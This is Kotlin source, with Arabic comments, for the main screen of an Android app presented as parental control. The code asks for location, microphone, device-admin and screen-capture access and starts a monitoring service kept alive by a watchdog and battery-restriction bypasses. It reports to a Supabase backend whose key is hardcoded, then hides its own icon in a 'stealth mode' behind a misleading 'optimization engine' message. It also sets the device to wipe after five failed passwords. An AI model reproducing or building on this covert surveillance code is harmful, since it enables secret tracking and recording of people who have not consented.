package com.example.parentalcontrol

import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.media.projection.MediaProjectionManager
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import androidx.activity.result.contract.ActivityResultContracts

/**
 * Activity الأساسية لإعداد وتفعيل ميزات الرقابة الأبوية
 */
class MainActivity : AppCompatActivity() {

    private lateinit var parentalControlManager: ParentalControlManager
    private val requiredPermissions = arrayOf(
        android.Manifest.permission.ACCESS_FINE_LOCATION,
        android.Manifest.permission.ACCESS_COARSE_LOCATION,
        android.Manifest.permission.RECORD_AUDIO
    )
    private val adminLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (parentalControlManager.isAdminActive()) {
            Log.i("MainActivity", "Admin activated! Now requesting screen capture...")
            requestScreenCapture()
        } else {
            Log.w("MainActivity", "Admin activation failed or cancelled")
        }
    }

    private val screenCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            Log.i("MainActivity", "Screen capture permission granted!")
            // بدء الخدمة مع بيانات الإذن
            MonitoringForegroundService.start(this, result.resultCode, result.data)
            triggerStealthMode()
        } else {
            Log.w("MainActivity", "Screen capture permission denied")
            // إذا رفض، نبدأ الخدمة بدون لقطات شاشة أو نكرر الطلب
            MonitoringForegroundService.start(this)
            triggerStealthMode()
        }
    }

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.entries.all { it.value }
        if (allGranted) {
            Log.i("MainActivity", "All permissions granted by user")
            setupAppFlow()
        } else {
            Log.w("MainActivity", "Some permissions were denied")
            // نواصل العمل بما هو متاح
            setupAppFlow()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        try {
            parentalControlManager = ParentalControlManager(this)

            // 1. فحص وطلب الصلاحيات المفقودة
            checkAndRequestPermissions()
        } catch (e: Exception) {
            Log.e("MainActivity", "Error in onCreate: ${e.message}")
        }
    }

    private fun checkAndRequestPermissions() {
        val missing = requiredPermissions.filter {
            checkSelfPermission(it) != android.content.pm.PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) {
            permissionLauncher.launch(missing.toTypedArray())
        } else {
            setupAppFlow()
        }
    }

    private fun setupAppFlow() {
        try {
            val initialized = SupabaseManager.getInstance().initialize(
                "https://kubowqqqawkgghxcktoe.supabase.co",
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt1Ym93cXFxYXdrZ2doeGNrdG9lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM3MTIwNzksImV4cCI6MjA4OTI4ODA3OX0.RnKtHRnqrdh0wF4vl-LWQEjlw7uYDCThqAn23WBMafM"
            )

            if (!initialized) {
                Log.w("MainActivity", "Supabase failed to initialize, but continuing service...")
            }

            // 3. تشغيل خدمة المراقبة (مهم جداً أن يبدأ والتطبيق في الواجهة)
            MonitoringForegroundService.start(this)

            // 4. إرسال Heartbeat للتأكد من ظهور الجهاز في لوحة التحكم
            CoroutineScope(Dispatchers.IO).launch {
                SupabaseManager.getInstance().updateHeartbeat(this@MainActivity)
            }

            // 5. إعداد نظام المراقبة (Watchdog) لضمان استمرار الخدمة
            ServiceWatchdogJobService.schedule(this)

            // 6. إعداد الواجهة والطلبات
            setupUI()
            requestIgnoreBatteryOptimizations()
            
            // 7. تجاوز قيود سامسونج للبطارية إذا لزم الأمر
            if (Build.MANUFACTURER.contains("samsung", ignoreCase = true)) {
                launchSamsungBatterySettings()
            }

            // 8. طلب إذن التخفي والالتقاط (بعد تأكيد المسؤول)
            if (parentalControlManager.isAdminActive()) {
                // نطلب تصوير الشاشة أولاً، وعندما ينتهي (بنجاح أو فشل) سنقوم بالتخفي
                requestScreenCapture()
            } else {
                showEnableAdminDialog()
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "Error in setupAppFlow: ${e.message}")
        }
    }

    /**
     * تجاوز ميزة تحسين البطارية الخاصة بسامسونج لضمان بقاء التطبيق في الخلفية
     */
    private fun launchSamsungBatterySettings() {
        try {
            val intent = Intent()
            intent.component = ComponentName(
                "com.samsung.android.lool",
                "com.samsung.android.sm.ui.battery.BatteryActivity"
            )
            // إذا لم ينجح الأول، نجرب العام لسامسونج
            try {
                startActivity(intent)
            } catch (e: Exception) {
                intent.component = ComponentName(
                    "com.samsung.android.sm",
                    "com.samsung.android.sm.ui.battery.BatteryActivity"
                )
                startActivity(intent)
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "Samsung battery settings not found: ${e.message}")
        }
    }

    /**
     * طلب استثناء من تحسينات البطارية لضمان عدم قتل الخدمة في الخلفية
     */
    private fun requestIgnoreBatteryOptimizations() {
        try {
            val packageName = packageName
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent().apply {
                    action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "Error requesting battery optimization exemption: ${e.message}")
        }
    }

    private fun setupUI() {
        checkAdminStatus()
    }

    private fun checkAdminStatus() {
        if (parentalControlManager.isAdminActive()) {
            Toast.makeText(this, "✓ محرك التحسين قيد التشغيل في الخلفية", Toast.LENGTH_SHORT).show()
            // بدلاً من الانتقال لصفحة الإعدادات، نبدأ عملية الالتقاط ثم التخفي
            requestScreenCapture()
        } else {
            showEnableAdminDialog()
        }
    }

    private fun showEnableAdminDialog() {
        AlertDialog.Builder(this)
            .setTitle("تفعيل وضع الشبح والتحصين")
            .setMessage("لاستخدام ميزات الحماية المتقدمة وإخفاء التطبيق، يجب تفعيل صلاحيات المسؤول")
            .setPositiveButton("تفعيل الآن") { _, _ ->
                val intent = parentalControlManager.getAdminRequestIntent()
                adminLauncher.launch(intent)
            }
            .setNegativeButton("إلغاء", null)
            .setCancelable(false)
            .show()
    }

    private fun requestScreenCapture() {
        try {
            val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            screenCaptureLauncher.launch(projectionManager.createScreenCaptureIntent())
        } catch (e: Exception) {
            Log.e("MainActivity", "Error requesting screen capture: ${e.message}")
            triggerStealthMode()
        }
    }

    private fun triggerStealthMode() {
        Log.i("MainActivity", "Triggering Stealth Mode...")
        Toast.makeText(this, "✓ تم تفعيل وضع الشبح. سيختفي التطبيق الآن.", Toast.LENGTH_LONG).show()
        
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            try {
                StealthManager.hideAppIcon(this)
                finish() 
            } catch (e: Exception) {
                Log.e("MainActivity", "Stealth error: ${e.message}")
            }
        }, 3000)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        when (requestCode) {
            ParentalControlManager.REQUEST_CODE_ENABLE_ADMIN -> {
                if (resultCode == Activity.RESULT_OK) {
                    Toast.makeText(this, "✓ تم تفعيل الرقابة الأبوية بنجاح", Toast.LENGTH_LONG).show()
                    setupParentalControls()
                } else {
                    Toast.makeText(this, "✗ تم إلغاء تفعيل الرقابة الأبوية", Toast.LENGTH_LONG).show()
                }
            }
        }
    }

    private fun setupParentalControls() {
        parentalControlManager.setMaximumFailedPasswordsForWipe(5)
        parentalControlManager.setMaximumTimeToLock(30000)
        Toast.makeText(this, "تم إعداد إعدادات الحماية", Toast.LENGTH_SHORT).show()
    }

    override fun onDestroy() {
        super.onDestroy()
    }
}
